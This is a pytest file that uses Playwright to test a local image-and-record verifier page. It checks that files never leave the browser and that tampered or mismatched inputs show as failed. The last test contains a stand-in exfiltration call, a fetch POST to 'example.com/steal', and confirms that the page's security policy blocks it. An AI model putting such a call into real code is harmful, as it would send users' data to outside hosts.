"""
The static verifier page, driven in a real browser.

Proves the claim the page makes: files are processed locally and never sent anywhere. Every network
request the page makes is captured; the only ones allowed are GETs for the page's own assets and for
public block headers (answered here by a fake, so nothing touches the internet), none with a body.

Skips when Playwright, an installed Chrome/Edge, the built page (``cd web && npm run build:verifier``)
or the vectors (``python scripts/make_verifier_vectors.py``) are missing.
"""

from __future__ import annotations

import base64
import functools
import http.server
import json
import threading
from pathlib import Path

import pytest

sync_api = pytest.importorskip("playwright.sync_api")

ROOT = Path(__file__).resolve().parent.parent
DIST = ROOT / "web" / "dist-verifier"
VECTORS = ROOT / "web" / "test" / "vectors.json"

pytestmark = pytest.mark.skipif(
    not (DIST / "index.html").exists() or not VECTORS.exists(),
    reason="build the verifier (cd web && npm run build:verifier) and the vectors first",
)

EXPLORER_HOSTS = ("blockstream.info", "mempool.space")


class _Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):  # noqa: A002 - signature mandated by the base class
        pass


@pytest.fixture(scope="module")
def site():
    handler = functools.partial(_Quiet, directory=str(DIST))
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{server.server_address[1]}"
    server.shutdown()


@pytest.fixture(scope="module")
def browser():
    with sync_api.sync_playwright() as pw:
        for channel in ("chrome", "msedge"):
            try:
                b = pw.chromium.launch(channel=channel)
                break
            except Exception:  # noqa: BLE001
                b = None
        if b is None:
            pytest.skip("no installed Chrome or Edge for Playwright")
        yield b
        b.close()


@pytest.fixture(scope="module")
def vectors():
    return json.loads(VECTORS.read_text(encoding="utf-8"))


def _open(browser, site, vectors):
    page = browser.new_page()
    seen: list[dict] = []

    def handle(route, request):
        host = request.url.split("/")[2]
        seen.append({"url": request.url, "method": request.method, "body": request.post_data_buffer})
        if any(host.startswith(h) for h in EXPLORER_HOSTS):
            if "/block-height/" in request.url:
                route.fulfill(status=200, body="a" * 64, headers={"access-control-allow-origin": "*"})
            else:
                route.fulfill(status=200, body=vectors["header_hex"], headers={"access-control-allow-origin": "*"})
        elif host.startswith("127.0.0.1"):
            route.continue_()
        else:
            route.abort()

    page.route("**/*", handle)
    page.goto(site + "/index.html")
    return page, seen


def test_verified_record_and_image_never_leave_the_page(browser, site, vectors, tmp_path):
    record = tmp_path / "record.json"
    record.write_text(json.dumps(vectors["records"]["signed_attested"]))
    image = tmp_path / "photo.png"
    image_bytes = base64.b64decode(vectors["image_b64"])
    image.write_bytes(image_bytes)

    page, seen = _open(browser, site, vectors)
    page.set_input_files("#image-file", str(image))
    page.set_input_files("#record-file", str(record))
    page.wait_for_selector(".stamp")
    assert page.inner_text(".stamp").strip().lower() == "verified"
    assert "byte-for-byte" in page.inner_text("#result")

    own = [r for r in seen if r["url"].startswith(site)]
    explorers = [r for r in seen if any(h in r["url"] for h in EXPLORER_HOSTS)]
    assert own and explorers
    assert len(own) + len(explorers) == len(seen), "request to an unexpected host"
    for r in seen:
        assert r["method"] in ("GET", "HEAD")
        assert not r["body"]
        assert image_bytes[:32] not in r["url"].encode()
    assert "blockstream.info" in page.inner_text("#netlog")
    page.close()


def test_tampered_record_shows_failed(browser, site, vectors, tmp_path):
    forged = json.loads(json.dumps(vectors["records"]["signed_attested"]))
    forged["payload"]["note"] = "edited after signing"
    record = tmp_path / "forged.json"
    record.write_text(json.dumps(forged))
    page, _ = _open(browser, site, vectors)
    page.set_input_files("#record-file", str(record))
    page.wait_for_selector(".stamp")
    assert page.inner_text(".stamp").strip().lower() == "failed"
    assert "modified" in page.inner_text("#result")
    page.close()


def test_wrong_image_and_pinned_key(browser, site, vectors, tmp_path):
    record = tmp_path / "r.json"
    record.write_text(json.dumps(vectors["records"]["signed_attested"]))
    other = tmp_path / "other.png"
    other.write_bytes(base64.b64decode(vectors["image_b64"]) + b"x")
    page, _ = _open(browser, site, vectors)
    page.set_input_files("#record-file", str(record))
    page.wait_for_selector(".stamp")
    assert page.inner_text(".stamp").strip().lower() == "verified"
    page.set_input_files("#image-file", str(other))
    page.wait_for_function("document.querySelector('.stamp').textContent.trim().toLowerCase() === 'failed'")
    page.click("#clear")
    page.set_input_files("#record-file", str(record))
    page.click(".adv summary")
    page.fill("#pin", "11" * 32)
    page.dispatch_event("#pin", "change")
    page.wait_for_function("document.querySelector('.stamp').textContent.trim().toLowerCase() === 'failed'")
    assert "not in the trusted set" in page.inner_text("#result")
    page.close()


def test_page_cannot_reach_other_hosts_even_if_asked(browser, site, vectors):
    page, _ = _open(browser, site, vectors)
    result = page.evaluate(
        "fetch('https://example.com/steal', {method:'POST', body:'x'}).then(() => 'sent', () => 'blocked')"
    )
    assert result == "blocked"  # the Content-Security-Policy forbids it
    page.close()
